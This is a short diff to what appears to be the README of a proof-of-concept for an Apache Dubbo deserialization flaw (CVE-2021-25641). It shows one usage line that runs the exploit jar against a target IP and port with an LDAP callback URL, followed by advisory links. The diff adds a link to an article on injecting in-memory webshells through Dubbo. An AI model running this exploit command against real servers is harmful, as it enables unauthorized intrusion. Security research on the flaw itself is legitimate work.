@@ -19,3 +19,4 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/
 - [浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）](https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/)
 - https://checkmarx.com/blog/technical-blog/the-0xdabb-of-doom-cve-2021-25641/
+- [dubbo中使用hessian_http/dubbo协议注入内存马](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dubbo%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/)
